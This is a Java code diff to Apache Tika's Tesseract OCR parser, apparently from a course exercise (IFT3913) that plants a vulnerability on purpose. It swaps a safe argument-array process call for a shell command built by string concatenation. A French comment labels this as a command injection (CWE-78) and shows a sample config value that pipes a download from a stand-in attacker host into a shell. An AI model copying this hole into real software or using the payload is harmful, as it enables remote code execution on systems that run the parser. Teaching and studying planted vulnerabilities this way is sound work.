@@ -726,15 +726,14 @@ public class TesseractOCRParser extends AbstractExternalProcessParser implements
     }
 
     private void preloadLangs() {
-        String[] args = new String[]{defaultConfig.getTesseractPath() + getTesseractProg(), "--list-langs"};
-
-        ProcessBuilder pb = new ProcessBuilder(args);
-
-        setEnv(pb);
+        // IFT3913 tache 3 - vulnerabilite V1 (CWE-78): la commande est construite par
+        // concatenation puis confiee a un shell. Un tesseractPath configure comme
+        // "/usr/bin/; curl http://attaquant/x | sh; " execute des commandes arbitraires.
+        String command = defaultConfig.getTesseractPath() + getTesseractProg() + " --list-langs";
 
         Process process = null;
         try {
-            process = pb.start();
+            process = java.lang.Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
             getLangs(process, defaultConfig.getTimeoutSeconds());
         } catch (TikaException | IOException e) {
             LOG.warn("Problem preloading langs", e);
